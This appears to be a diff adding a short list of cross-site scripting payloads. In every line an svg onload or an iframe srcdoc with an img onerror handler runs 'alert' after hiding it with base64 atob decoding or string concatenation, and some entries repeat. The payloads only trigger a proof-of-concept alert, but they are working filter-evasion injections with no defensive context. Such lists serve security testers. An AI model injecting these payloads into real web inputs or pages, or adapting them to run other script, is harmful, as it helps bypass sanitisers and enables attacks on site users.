@@ -1,0 +1,11 @@
+<svg onload="window[atob('YWxlcnQ=')](123)">
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMTIzKQ=='))>">
+<iframe srcdoc="<svg onload=window['ale'+'rt'](123)>">
+<svg onload="eval(atob('YWxlcnQoMTIzKQ=='))">
+<iframe srcdoc="<img src=x onerror=window['ale'+'rt'](123)>">
+<svg onload="window['ale'+'rt'](123)">
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMTIzKQ=='))>">
+<iframe srcdoc="<img src=x onerror=window[atob('YWxlcnQ=')](123)>">
+<svg onload="window[atob('YWxlcnQ=')](123)">
+<iframe srcdoc="<svg onload=window['ale'+'rt'](123)>">
+<svg onload="eval(atob('YWxlcnQoMTIzKQ=='))">
